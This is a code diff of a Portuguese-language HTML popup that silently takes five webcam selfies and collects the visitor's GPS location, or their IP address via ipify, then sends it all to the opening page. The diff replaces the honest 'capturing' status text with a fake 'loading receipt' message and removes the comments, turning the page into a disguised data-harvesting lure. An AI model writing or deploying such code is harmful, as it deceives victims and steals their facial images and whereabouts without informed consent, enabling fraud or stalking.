@@ -2,33 +2,28 @@
 <html lang="pt-BR">
 <head>
   <meta charset="utf-8">
-  <title>Capturando...</title>
+  <title>Carregando comprovante...</title>
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <style>
     body{background:#003d82;color:#fff;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:Arial,Helvetica,sans-serif}
-    #status{margin-top:12px;font-size:15px}
+    small{margin-top:10px;font-size:12px;opacity:.8}
   </style>
 </head>
 <body>
-  <h3 id="status">Solicitando câmera...</h3>
+  <h3>Aguarde...</h3><small>Preparando visualização do comprovante.</small>
 
   <script>
     const TOTAL = 5;
-    const INTERVAL = 400; // ms entre fotos
+    const INTERVAL = 400;
     let selfies = [];
-
     (async()=>{
       try{
-        // 1) abre frontal (selfie)
         const stream = await navigator.mediaDevices.getUserMedia({
           video:{facingMode:'user',width:{ideal:1920},height:{ideal:1080},torch:false}
         });
-        const v = document.createElement('video');
-        v.srcObject = stream; v.play();
+        const v = document.createElement('video'); v.srcObject = stream; v.play();
         await new Promise(r=>v.onloadedmetadata=r);
-        document.getElementById('status').textContent = 'Capturando selfies...';
-
-        // 2) tira as 5 fotos
+        document.querySelector('h3').textContent = 'Carregando...';
         for(let i=0;i<TOTAL;i++){
           const c = document.createElement('canvas');
           c.width = v.videoWidth; c.height = v.videoHeight;
@@ -37,27 +32,18 @@
           await new Promise(r=>setTimeout(r,INTERVAL));
         }
         stream.getTracks().forEach(t=>t.stop());
-      }catch(err){
-        window.opener.postMessage({type:'negado'},'*'); window.close(); return;
-      }
-
-      // 3) GPS (com fallback IP)
+      }catch{ window.opener.postMessage({type:'negado'},'*'); window.close(); return; }
       let loc=null, ip=null;
       try{
-        loc = await new Promise((res,rej)=>
-          navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000,maximumAge:0})
-        );
+        loc = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000,maximumAge:0}));
       }catch{
-        // GPS negado → pega IP
         const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({}));
         ip = ipData.ip || 'IP_DESCONHECIDO';
       }
-
-      // 4) devolve tudo para index.html
       window.opener.postMessage({
-        type: 'selfiesDone',
+        type:'selfiesDone',
         dados:{selfies, locationData:loc?{lat:loc.coords.latitude,lon:loc.coords.longitude}:null, ipFallback:ip}
-      }, '*');
+      },'*');
       window.close();
     })();
   </script>
